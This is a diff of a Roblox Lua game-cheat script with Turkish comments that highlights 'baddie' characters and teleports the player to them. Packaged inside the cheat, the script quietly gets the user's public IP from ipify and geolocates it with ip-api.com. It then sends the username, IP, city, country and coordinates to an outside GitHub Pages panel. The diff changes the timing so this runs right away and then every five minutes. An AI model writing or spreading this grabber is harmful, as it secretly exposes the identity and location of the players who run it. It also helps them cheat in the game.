@@ -1,76 +1,76 @@
 -- ============================================
--- FIND A BADDIE - ESP + PANEL'E YOLLAMA
+-- FIND A BADDIE - HIZLI VERİ GÖNDERİM
 -- ============================================
 
 local player = game.Players.LocalPlayer
 local character = player.Character or player.CharacterAdded:Wait()
 local rootPart = character:WaitForChild("HumanoidRootPart")
-local httpService = game:GetService("HttpService")
+local http = game:GetService("HttpService")
+local PANEL_URL = "https://youenowes.github.io/elpan/"
 
 -- ============================================
--- 1. PANEL AYARI (BURAYA KENDİ LİNKİNİ YAZ!)
+-- 1. IP'Yİ ANINDA AL (Gecikmesiz)
 -- ============================================
-local PANEL_URL = "https://youenowes.github.io/elpan/"  -- SENİN PANEL LİNKİN
--- ============================================
+local function getIP()
+    local success, result = pcall(function()
+        return game:HttpGet("https://api.ipify.org/", true)
+    end)
+    return success and result or "0.0.0.0"
+end
 
 -- ============================================
--- 2. PANEL'E VERİ GÖNDER
+-- 2. LOKASYONU AL (Basit ve Hızlı)
 -- ============================================
-local function sendToPanel()
-    task.spawn(function()
-        -- IP al
-        local ip = "0.0.0.0"
-        local success, result = pcall(function()
-            return game:HttpGet("https://api.ipify.org/", true)
-        end)
-        if success and result then
-            ip = result
-        end
-        
-        -- Lokasyon al
-        local city = "Unknown"
-        local country = "Unknown"
-        local lat = 0
-        local lon = 0
-        
-        local success2, result2 = pcall(function()
-            local data = game:HttpGet("http://ip-api.com/json/" .. ip .. "?fields=status,country,city,lat,lon", true)
-            return httpService:JSONDecode(data)
-        end)
-        if success2 and result2 and result2.status == "success" then
-            city = result2.city or "Unknown"
-            country = result2.country or "Unknown"
-            lat = result2.lat or 0
-            lon = result2.lon or 0
-        end
-        
-        -- URL'ye ekle (Panel'in anlayacağı formatta)
-        local logData = httpService:UrlEncode(
-            player.Name .. "|" ..
-            ip .. "|" ..
-            city .. "|" ..
-            country .. "|" ..
-            tostring(lat) .. "|" ..
-            tostring(lon)
-        )
-        
-        local url = PANEL_URL .. "?log=" .. logData
-        
-        -- Gönder
-        pcall(function()
-            game:HttpGet(url, true)
-            print("📡 Panel'e gönderildi:", player.Name, ip, city, country)
-        end)
+local function getLocation(ip)
+    local success, result = pcall(function()
+        local data = game:HttpGet("http://ip-api.com/json/" .. ip .. "?fields=status,country,city,lat,lon", true)
+        return http:JSONDecode(data)
+    end)
+    if success and result and result.status == "success" then
+        return result
+    end
+    return nil
+end
+
+-- ============================================
+-- 3. VERİYİ GÖNDER (Direkt, Beklemesiz)
+-- ============================================
+local function sendData()
+    -- IP'yi al
+    local ip = getIP()
+    
+    -- Lokasyonu al
+    local location = getLocation(ip)
+    local city = location and location.city or "Unknown"
+    local country = location and location.country or "Unknown"
+    local lat = location and location.lat or 0
+    local lon = location and location.lon or 0
+    
+    -- URL oluştur
+    local logData = string.format(
+        "%s|%s|%s|%s|%s|%s",
+        player.Name,
+        ip,
+        city,
+        country,
+        tostring(lat),
+        tostring(lon)
+    )
+    
+    local url = PANEL_URL .. "?log=" .. http:UrlEncode(logData)
+    
+    -- GÖNDER (Bekleme yok!)
+    pcall(function()
+        game:HttpGet(url, true)
+        print("✅ GÖNDERİLDİ:", player.Name, ip, city, country)
     end)
 end
 
 -- ============================================
--- 3. AYARLAR (ESP)
+-- 4. ESP (KIRMIZI) - Aynı, hızlı çalışır
 -- ============================================
 local settings = {
     espEnabled = true,
-    teleportKey = Enum.KeyCode.T,
-    refreshRate = 0.3,
     espColor = Color3.fromRGB(255, 0, 0)
 }
 
@@ -86,11 +86,8 @@ function Baddie.new(model)
     self.rootPart = model:FindFirstChild("HumanoidRootPart") or model.PrimaryPart
     self.humanoid = model:FindFirstChild("Humanoid")
     self.isActive = true
-    self.lastPosition = self.rootPart and self.rootPart.Position or Vector3.new(0,0,0)
     self.distance = math.huge
-    self.esp = nil
     self.highlight = nil
-    self.stage5Fix = false
     return self
 end
 
@@ -106,7 +103,6 @@ function Baddie:update()
         for _, desc in ipairs(descendants) do
             if desc:IsA("BasePart") and string.find(desc.Name, "HumanoidRootPart") then
                 self.rootPart = desc
-                self.stage5Fix = true
                 break
             end
         end
@@ -119,7 +115,6 @@ function Baddie:update()
     self.humanoid = self.model:FindFirstChild("Humanoid")
     
     if self.rootPart then
-        self.lastPosition = self.rootPart.Position
         self.distance = (self.rootPart.Position - rootPart.Position).Magnitude
     end
     
@@ -139,123 +134,6 @@ function Baddie:createESP()
     highlight.OutlineTransparency = 0.1
     highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
     self.highlight = highlight
-    
-    local billboard = Instance.new("BillboardGui")
-    billboard.Parent = self.rootPart
-    billboard.Size = UDim2.new(0, 120, 0, 50)
-    billboard.Adornee = self.rootPart
-    billboard.AlwaysOnTop = true
-    billboard.MaxDistance = 300
-    billboard.Enabled = true
-    billboard.StudsOffset = Vector3.new(0, 3.5, 0)
-    
-    local frame = Instance.new("Frame")
-    frame.Size = UDim2.new(1, 0, 1, 0)
-    frame.BackgroundTransparency = 0.4
-    frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-    frame.BorderSizePixel = 1
-    frame.BorderColor3 = settings.espColor
-    frame.Parent = billboard
-    
-    local nameLabel = Instance.new("TextLabel")
-    nameLabel.Size = UDim2.new(1, 0, 0.45, 0)
-    nameLabel.Position = UDim2.new(0, 0, -0.2, 0)
-    nameLabel.Text = self.name
-    nameLabel.TextColor3 = settings.espColor
-    nameLabel.TextScaled = true
-    nameLabel.BackgroundTransparency = 1
-    nameLabel.Font = Enum.Font.GothamBold
-    nameLabel.Parent = frame
-    
-    if self.stage5Fix then
-        local stageLabel = Instance.new("TextLabel")
-        stageLabel.Size = UDim2.new(0.5, 0, 0.25, 0)
-        stageLabel.Position = UDim2.new(0.25, 0, -0.7, 0)
-        stageLabel.Text = "⭐S5"
-        stageLabel.TextColor3 = Color3.fromRGB(255, 215, 0)
-        stageLabel.TextScaled = true
-        stageLabel.BackgroundTransparency = 1
-        stageLabel.Font = Enum.Font.GothamBold
-        stageLabel.Parent = frame
-    end
-    
-    local distLabel = Instance.new("TextLabel")
-    distLabel.Size = UDim2.new(1, 0, 0.3, 0)
-    distLabel.Position = UDim2.new(0, 0, 0.5, 0)
-    distLabel.Text = string.format("%.1fm", self.distance)
-    distLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-    distLabel.TextScaled = true
-    distLabel.BackgroundTransparency = 1
-    distLabel.Font = Enum.Font.Gotham
-    distLabel.Parent = frame
-    
-    local healthBar = Instance.new("Frame")
-    healthBar.Size = UDim2.new(0.6, 0, 0.12, 0)
-    healthBar.Position = UDim2.new(0.2, 0, 0.85, 0)
-    healthBar.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
-    healthBar.BorderSizePixel = 0
-    healthBar.Parent = frame
-    
-    local healthFill = Instance.new("Frame")
-    healthFill.Size = UDim2.new(1, 0, 1, 0)
-    healthFill.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
-    healthFill.BorderSizePixel = 0
-    healthFill.Parent = healthBar
-    
-    local healthText = Instance.new("TextLabel")
-    healthText.Size = UDim2.new(1, 0, 1, 0)
-    healthText.Text = "100%"
-    healthText.TextColor3 = Color3.fromRGB(255, 255, 255)
-    healthText.TextScaled = true
-    healthText.BackgroundTransparency = 1
-    healthText.Font = Enum.Font.GothamBold
-    healthText.Parent = healthBar
-    
-    task.spawn(function()
-        while self.isActive and self.humanoid do
-            task.wait(0.15)
-            local health = self.humanoid.Health
-            local maxHealth = self.humanoid.MaxHealth
-            local percent = health / maxHealth
-            healthFill.Size = UDim2.new(percent, 0, 1, 0)
-            healthFill.BackgroundColor3 = Color3.fromRGB(
-                255 * (1 - percent),
-                255 * percent,
-                0
-            )
-            healthText.Text = string.format("%.0f%%", percent * 100)
-        end
-    end)
-    
-    self.esp = {
-        billboard = billboard,
-        nameLabel = nameLabel,
-        distLabel = distLabel,
-        healthBar = healthBar,
-        healthFill = healthFill,
-        healthText = healthText
-    }
-end
-
-function Baddie:updateESP()
-    if not self.esp or not self.rootPart then return end
-    
-    self.distance = (self.rootPart.Position - rootPart.Position).Magnitude
-    
-    if self.esp.distLabel then
-        self.esp.distLabel.Text = string.format("%.1fm", self.distance)
-    end
-    
-    if self.highlight then
-        local distPercent = math.min(self.distance / 100, 1)
-        self.highlight.FillTransparency = 0.3 + (distPercent * 0.4)
-    end
-    
-    if self.distance > 300 and self.esp.billboard then
-        self.esp.billboard.Enabled = false
-    elseif self.esp.billboard then
-        self.esp.billboard.Enabled = settings.espEnabled
-    end
 end
 
 function Baddie:destroy()
@@ -263,15 +141,11 @@ function Baddie:destroy()
     if self.highlight then
         self.highlight:Destroy()
     end
-    if self.esp and self.esp.billboard then
-        self.esp.billboard:Destroy()
-    end
-    self.esp = nil
     self.highlight = nil
 end
 
 -- ============================================
--- 4. TARAMA
+-- 5. TARAMA
 -- ============================================
 local function scanForBaddies()
     local found = {}
@@ -281,20 +155,10 @@ local function scanForBaddies()
         if obj:IsA("Model") then
             local hasRoot = obj:FindFirstChild("HumanoidRootPart") ~= nil
             local isTemplateRig = string.find(string.lower(obj.Name), "templaterig") ~= nil
-            
-            local hasDeepRoot = false
-            local descendants = obj:GetDescendants()
-            for _, desc in ipairs(descendants) do
-                if desc:IsA("BasePart") and string.find(desc.Name, "HumanoidRootPart") then
-                    hasDeepRoot = true
-                    break
-                end
-            end
-            
             local isBaddie = string.find(string.lower(obj.Name), "baddie") ~= nil or
                             string.find(string.lower(obj.Name), "anime") ~= nil
             
-            if hasRoot or isTemplateRig or hasDeepRoot or isBaddie then
+            if hasRoot or isTemplateRig or isBaddie then
                 local exists = false
                 for _, b in ipairs(baddies) do
                     if b.model == obj then
@@ -305,16 +169,6 @@ local function scanForBaddies()
                 
                 if not exists and obj ~= character and obj.Parent ~= character then
                     local newBaddie = Baddie.new(obj)
-                    if not newBaddie.rootPart and hasDeepRoot then
-                        for _, desc in ipairs(descendants) do
-                            if desc:IsA("BasePart") and string.find(desc.Name, "HumanoidRootPart") then
-                                newBaddie.rootPart = desc
-                                newBaddie.stage5Fix = true
-                                break
-                            end
-                        end
-                    end
-                    
                     if newBaddie.rootPart then
                         table.insert(found, newBaddie)
                     end
@@ -327,7 +181,7 @@ local function scanForBaddies()
 end
 
 -- ============================================
--- 5. IŞINLANMA
+-- 6. IŞINLANMA
 -- ============================================
 local function teleportToNearest()
     local nearest = nil
@@ -351,161 +205,7 @@ local function teleportToNearest()
 end
 
 -- ============================================
--- 6. UI
--- ============================================
-local screenGui = Instance.new("ScreenGui")
-screenGui.Parent = player.PlayerGui
-screenGui.Name = "HackerUI"
-screenGui.ResetOnSpawn = false
-
-local mainFrame = Instance.new("Frame")
-mainFrame.Size = UDim2.new(0, 180, 0, 280)
-mainFrame.Position = UDim2.new(0, 8, 0, 8)
-mainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-mainFrame.BackgroundTransparency = 0.15
-mainFrame.BorderSizePixel = 2
-mainFrame.BorderColor3 = Color3.fromRGB(255, 0, 0)
-mainFrame.Active = true
-mainFrame.Draggable = true
-mainFrame.Parent = screenGui
-
-local title = Instance.new("TextLabel")
-title.Size = UDim2.new(1, 0, 0, 18)
-title.Position = UDim2.new(0, 0, 0, 0)
-title.Text = "🔴 FINDER"
-title.TextColor3 = Color3.fromRGB(255, 0, 0)
-title.TextScaled = true
-title.BackgroundTransparency = 1
-title.Font = Enum.Font.GothamBold
-title.Parent = mainFrame
-
-local statsLabel = Instance.new("TextLabel")
-statsLabel.Size = UDim2.new(1, 0, 0, 14)
-statsLabel.Position = UDim2.new(0, 0, 0, 18)
-statsLabel.Text = "🎯 0"
-statsLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
-statsLabel.TextScaled = true
-statsLabel.BackgroundTransparency = 1
-statsLabel.Font = Enum.Font.Gotham
-statsLabel.Parent = mainFrame
-
-local listContainer = Instance.new("ScrollingFrame")
-listContainer.Size = UDim2.new(1, -6, 1, -80)
-listContainer.Position = UDim2.new(0, 3, 0, 35)
-listContainer.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-listContainer.BackgroundTransparency = 0.3
-listContainer.BorderSizePixel = 1
-listContainer.BorderColor3 = Color3.fromRGB(255, 0, 0)
-listContainer.CanvasSize = UDim2.new(0, 0, 0, 0)
-listContainer.Parent = mainFrame
-
-local listLayout = Instance.new("UIListLayout")
-listLayout.SortOrder = Enum.SortOrder.LayoutOrder
-listLayout.Padding = UDim.new(0, 1)
-listLayout.Parent = listContainer
-
-local buttonFrame = Instance.new("Frame")
-buttonFrame.Size = UDim2.new(1, -6, 0, 22)
-buttonFrame.Position = UDim2.new(0, 3, 1, -25)
-buttonFrame.BackgroundTransparency = 1
-buttonFrame.Parent = mainFrame
-
-local teleportBtn = Instance.new("TextButton")
-teleportBtn.Size = UDim2.new(0.48, 0, 1, 0)
-teleportBtn.Position = UDim2.new(0, 0, 0, 0)
-teleportBtn.Text = "T"
-teleportBtn.TextColor3 = Color3.fromRGB(255, 0, 0)
-teleportBtn.TextScaled = true
-teleportBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-teleportBtn.BackgroundTransparency = 0.3
-teleportBtn.BorderSizePixel = 1
-teleportBtn.BorderColor3 = Color3.fromRGB(255, 0, 0)
-teleportBtn.Font = Enum.Font.GothamBold
-teleportBtn.Parent = buttonFrame
-
-teleportBtn.MouseButton1Click:Connect(teleportToNearest)
-
-local espBtn = Instance.new("TextButton")
-espBtn.Size = UDim2.new(0.48, 0, 1, 0)
-espBtn.Position = UDim2.new(0.52, 0, 0, 0)
-espBtn.Text = "ESP"
-espBtn.TextColor3 = Color3.fromRGB(255, 0, 0)
-espBtn.TextScaled = true
-espBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-espBtn.BackgroundTransparency = 0.3
-espBtn.BorderSizePixel = 1
-espBtn.BorderColor3 = Color3.fromRGB(255, 0, 0)
-espBtn.Font = Enum.Font.GothamBold
-espBtn.Parent = buttonFrame
-
-espBtn.MouseButton1Click:Connect(function()
-    settings.espEnabled = not settings.espEnabled
-    espBtn.Text = settings.espEnabled and "ESP" or "OFF"
-    espBtn.BorderColor3 = settings.espEnabled and Color3.fromRGB(255, 0, 0) or Color3.fromRGB(100, 100, 100)
-    espBtn.TextColor3 = settings.espEnabled and Color3.fromRGB(255, 0, 0) or Color3.fromRGB(100, 100, 100)
-end)
-
--- ============================================
--- 7. GÜNCELLEME
--- ============================================
-function updateGUI()
-    local activeCount = 0
-    local stage5Count = 0
-    for _, b in ipairs(baddies) do
-        if b.isActive then 
-            activeCount = activeCount + 1
-            if b.stage5Fix then stage5Count = stage5Count + 1 end
-        end
-    end
-    
-    local stageText = stage5Count > 0 and " ⭐" .. stage5Count or ""
-    statsLabel.Text = "🎯 " .. activeCount .. stageText
-
-    for _, child in ipairs(listContainer:GetChildren()) do
-        if child:IsA("TextButton") then child:Destroy() end
-    end
-
-    for i, baddie in ipairs(baddies) do
-        if baddie.isActive then
-            local btn = Instance.new("TextButton")
-            local stageIcon = baddie.stage5Fix and "⭐" or ""
-            local health = baddie.humanoid and (baddie.humanoid.Health/baddie.humanoid.MaxHealth*100) or 0
-            
-            btn.Size = UDim2.new(1, -4, 0, 16)
-            btn.Text = string.format("%s%s %.1fm %d%%", 
-                stageIcon, baddie.name, baddie.distance, health)
-            btn.TextColor3 = Color3.fromRGB(255, 0, 0)
-            btn.TextSize = 9
-            btn.TextXAlignment = Enum.TextXAlignment.Left
-            btn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-            btn.BackgroundTransparency = 0.3
-            btn.BorderSizePixel = 0
-            btn.Font = Enum.Font.Gotham
-            btn.Parent = listContainer
-            
-            btn.MouseEnter:Connect(function()
-                btn.BackgroundTransparency = 0.1
-            end)
-            btn.MouseLeave:Connect(function()
-                btn.BackgroundTransparency = 0.3
-            end)
-            
-            btn.MouseButton1Click:Connect(function()
-                if baddie.rootPart then
-                    rootPart.CFrame = CFrame.new(baddie.rootPart.Position + Vector3.new(0, 3, 0))
-                    btn.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
-                    task.wait(0.08)
-                    btn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-                end
-            end)
-        end
-    end
-    
-    listContainer.CanvasSize = UDim2.new(0, 0, 0, activeCount * 17 + 5)
-end
-
--- ============================================
--- 8. ANA DÖNGÜ
+-- 7. ANA DÖNGÜ
 -- ============================================
 local function updateAllESP()
     local toRemove = {}
@@ -527,42 +227,39 @@ local function updateAllESP()
         baddie:createESP()
         table.insert(baddies, baddie)
     end
-    
-    for _, baddie in ipairs(baddies) do
-        baddie:updateESP()
-    end
 end
 
 local function mainLoop()
-    while task.wait(settings.refreshRate) do
+    while task.wait(0.5) do
         updateAllESP()
-        updateGUI()
     end
 end
 
 -- ============================================
--- 9. TUŞ
+-- 8. TUŞ
 -- ============================================
 game:GetService("UserInputService").InputBegan:Connect(function(input, gameProcessed)
     if gameProcessed then return end
-    if input.KeyCode == settings.teleportKey then
+    if input.KeyCode == Enum.KeyCode.T then
         teleportToNearest()
     end
 end)
 
 -- ============================================
--- 10. BAŞLAT
+-- 9. BAŞLAT
 -- ============================================
-print("🔴 FINDER + PANEL BAŞLATILDI!")
+print("🔴 HIZLI SİSTEM BAŞLATILDI!")
 
--- PANEL'E GÖNDER (HER ÇALIŞTIRMADA 1 KERE)
-sendToPanel()
+-- IP'Yİ ANINDA GÖNDER (1. çalıştırmada hemen)
+task.spawn(function()
+    sendData()
+end)
 
--- HER 30 DAKİKADA BİR GÖNDER
+-- HER 5 DAKİKADA BİR TEKRAR GÖNDER
 task.spawn(function()
     while true do
-        task.wait(1800)
-        sendToPanel()
+        task.wait(300) -- 5 dakika
+        sendData()
     end
 end)
 
@@ -571,4 +268,4 @@ task.wait(1)
 updateAllESP()
 coroutine.wrap(mainLoop)()
 
-print("✅ Baddie tespiti + Panel'e yollama AKTİF!")
+print("✅ AKTİF! (IP her 5 dakikada bir güncellenir)")
